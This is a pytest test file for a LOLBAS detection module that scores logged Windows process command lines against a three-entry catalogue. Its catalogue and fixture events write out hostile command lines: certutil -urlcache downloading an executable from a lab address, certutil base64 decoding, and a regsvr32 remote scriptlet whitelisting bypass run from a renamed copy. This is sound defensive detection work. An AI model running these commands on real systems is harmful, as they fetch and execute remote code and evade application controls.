"""Lab: LOLBAS check (engine/labs/lolbas.py). A three-entry catalogue in the project's own JSON shape."""

import json
import re

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from engine.labs import lolbas as L
from nighttools_fixtures import configure, store_with

BANNED = re.compile(r"\b(probably|likely|safe|secure|all clear|all good|no threats?|clean|proven|detected|caught|"
                    r"malicious|attack(?:er)?)\b", re.I)

CATALOGUE = [
    {"Name": "Certutil.exe", "Description": "Windows binary used for handling certificates",
     "url": "https://lolbas-project.github.io/lolbas/Binaries/Certutil/",
     "Full_Path": [{"Path": "C:\\Windows\\System32\\certutil.exe"}, {"Path": "C:\\Windows\\SysWOW64\\certutil.exe"}],
     "Commands": [
         {"Command": "certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}", "Description": "Download and save an executable",
          "Usecase": "Download file from Internet", "Category": "Download", "Privileges": "User", "MitreID": "T1105"},
         {"Command": "certutil.exe -decode {PATH:.b64} {PATH:.exe}", "Description": "Decode a base64 file",
          "Usecase": "Decode payload", "Category": "Decode", "Privileges": "User", "MitreID": "T1140"}]},
    {"Name": "Regsvr32.exe", "Description": "Register and unregister DLLs",
     "Full_Path": [{"Path": "C:\\Windows\\System32\\regsvr32.exe"}],
     "Commands": [{"Command": "regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll", "Description": "Run a remote script",
                   "Usecase": "Execute code from a remote scriptlet", "Category": "AWL Bypass", "Privileges": "User",
                   "MitreID": "T1218.010"}]},
    {"Name": "Notepad.exe", "Description": "test entry with no switches", "Full_Path": [],
     "Commands": [{"Command": "notepad.exe {PATH}", "Category": "Execute", "MitreID": "T0000"}]},
]


@pytest.fixture
def catalogue(tmp_path, monkeypatch):
    p = tmp_path / "lolbas.json"
    p.write_text(json.dumps(CATALOGUE), encoding="utf-8")
    monkeypatch.setenv("ANALYSTLAB_LOLBAS_JSON", str(p))
    L._cache.update(key=None, data=None)
    return p


def client():
    app = FastAPI()
    app.include_router(L.router)
    return TestClient(app)


def test_switches_ignore_the_program_path_placeholders_urls_and_hyphenated_words():
    assert L.switches("certutil.exe -urlcache -split -f http://7-zip.org/a/7z.exe 7zip.exe") == ["-urlcache", "-split", "-f"]
    assert L.switches('"C:\\Windows\\System32\\regsvr32.exe" /s /u /i:http://10.0.2.2/x.sct scrobj.dll') == ["/s", "/u", "/i:"]
    assert L.switches("certutil.exe -decode {PATH:.b64} {PATH:.exe}") == ["-decode"]
    assert L.switches("cmd.exe /c C:\\Users\\x\\a.bat") == ["/c"]


def test_resemblance_is_the_share_of_documented_switches_and_accepts_dash_or_slash():
    doc = CATALOGUE[0]["Commands"][0]["Command"]
    score, hit = L.resemblance("CertUtil.exe /URLCache -f http://10.0.2.2:18765/p.exe C:\\t\\p.exe", doc)
    assert score == 1.0 and hit == ["-urlcache", "-f", "(a web address)"]
    assert L.resemblance("certutil.exe -urlcache", doc)[0] == pytest.approx(0.33)
    assert L.resemblance("certutil.exe -dump", doc) == (0.0, [])
    assert L.resemblance("notepad.exe a.txt", "notepad.exe {PATH}") == (0.0, [])        # nothing to compare: no claim


def test_check_finds_tools_renamed_copies_odd_places_and_resembling_runs(tmp_path, catalogue):
    db = store_with(str(tmp_path / "events.db"), [
        {"event_id": 1, "data": {"Image": "C:\\Windows\\System32\\certutil.exe", "OriginalFileName": "CertUtil.exe",
                                 "CommandLine": "certutil.exe -urlcache -f http://10.0.2.2:18765/p.exe p.exe",
                                 "ParentImage": "C:\\Windows\\System32\\cmd.exe", "Hashes": "SHA256=" + "A" * 64}},
        {"event_id": 1, "data": {"Image": "C:\\Windows\\System32\\certutil.exe", "OriginalFileName": "CertUtil.exe",
                                 "CommandLine": "certutil.exe -store my"}},
        {"event_id": 1, "data": {"Image": "C:\\Users\\Public\\upd.exe", "OriginalFileName": "REGSVR32.EXE",
                                 "CommandLine": "upd.exe /s /u /i:http://10.0.2.2/x.sct scrobj.dll"}},
        {"event_id": 1, "data": {"Image": "C:\\Windows\\System32\\whoami.exe", "CommandLine": "whoami"}},
        {"host": "MYLAPTOP", "event_id": 1, "data": {"Image": "C:\\Windows\\System32\\certutil.exe",
                                                     "CommandLine": "certutil -urlcache -f http://x/y z"}},   # not shown
    ])
    configure(tmp_path, db)
    body = client().get("/api/labs/lolbas").json()
    assert body["state"] == "ready" and body["catalogue_size"] == 3 and body["runs"] == 3 and body["resembling"] == 2
    tools = {t["name"]: t for t in body["tools"]}
    assert set(tools) == {"Certutil.exe", "Regsvr32.exe"}
    reg = tools["Regsvr32.exe"]
    assert body["tools"][0]["name"] == "Regsvr32.exe"          # resembling + renamed + odd place first
    run = reg["runs"][0]
    assert run["renamed_from"] == "REGSVR32.EXE" and run["documented_place"] is False and reg["odd_place"] == 1
    assert run["match"]["category"] == "AWL Bypass" and run["match"]["score"] == 0.8      # /n is missing: 4 of 5
    assert run["match"]["matched"] == ["/s", "/u", "/i:", "(a web address)"] and run["match"]["of"] == 5
    cert = tools["Certutil.exe"]
    assert cert["categories"] == ["Decode", "Download"] and cert["mitre"] == ["T1105", "T1140"]
    assert cert["page"] == "https://lolbas-project.github.io/lolbas/Binaries/Certutil/"
    assert cert["times"] == 2 and cert["resembling"] == 1 and cert["renamed"] == 0
    first, second = cert["runs"]
    assert first["match"]["category"] == "Download" and first["sha256"] == "a" * 64 and first["documented_place"] is True
    assert second["match"] is None and second["nearest"]["score"] == 0.0


def test_documented_places_with_version_placeholders_and_program_files_x86():
    pats = [L.place_pattern("C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\<version>\\msedgewebview2.exe")]
    assert L.at_documented_place("C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\155.0.1\\msedgewebview2.exe", pats)
    assert L.at_documented_place("c:\\program files\\microsoft\\edgewebview\\application\\9\\MSEDGEWEBVIEW2.EXE", pats)
    assert not L.at_documented_place("C:\\Users\\Public\\msedgewebview2.exe", pats)
    assert not L.at_documented_place("C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\1\\x\\msedgewebview2.exe", pats)
    assert L.at_documented_place("C:\\x.exe", []) is None
    # the catalogue gives example versions: another installed version is the same documented place
    ex = [L.place_pattern("C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\131.0.2903.70\\msedgewebview2.exe"),
          L.place_pattern("C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\\OpenConsole.exe")]
    assert L.at_documented_place("C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\155.0.4283.60\\msedgewebview2.exe", ex)
    assert L.at_documented_place("C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.23.12811.0_x64__8wekyb3d8bbwe\\OpenConsole.exe", ex)
    assert not L.at_documented_place("C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\155.0.4283.60\\x\\msedgewebview2.exe", ex)


def test_one_common_switch_out_of_two_does_not_resemble():
    doc = 'msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher="{CMD}"'
    weak = L.best_match("msedgewebview2.exe --type=gpu --disable-gpu-sandbox", {"Commands": [{"Command": doc}]})
    assert weak["score"] == 0.5 and not L.resembles(weak)
    strong = L.best_match('msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher="cmd /c x"', {"Commands": [{"Command": doc}]})
    assert strong["score"] == 1.0 and L.resembles(strong)
    single = L.best_match("certutil -decode a b", {"Commands": [{"Command": "certutil.exe -decode {PATH} {PATH}"}]})
    assert single["score"] == 1.0 and L.resembles(single)


def test_no_data_yet_is_said(tmp_path, monkeypatch):
    monkeypatch.setenv("ANALYSTLAB_LOLBAS_JSON", str(tmp_path / "absent.json"))
    configure(tmp_path, tmp_path / "missing.db")
    body = client().get("/api/labs/lolbas").json()
    assert body["state"] == "no_data" and body["words"]["no_data"].startswith("The LOLBAS data")


def test_no_store_yet_gives_an_empty_list(tmp_path, catalogue):
    configure(tmp_path, tmp_path / "missing.db")
    body = client().get("/api/labs/lolbas").json()
    assert body["state"] == "ready" and body["tools"] == []


def test_our_words_never_overclaim():
    assert not BANNED.search(json.dumps(L.WORDS)), BANNED.search(json.dumps(L.WORDS))


def test_technical_names_have_plain_words():
    """W3-6: every technical name on the page has a one-line plain meaning (served by Python)."""
    from engine.labs import lolbas as M
    assert sorted(M.WORDS["jargon"]) == sorted(['LOLBAS', 'ATT&CK'])
    assert all(len(v) > 20 and not BANNED.search(v) for v in M.WORDS["jargon"].values())
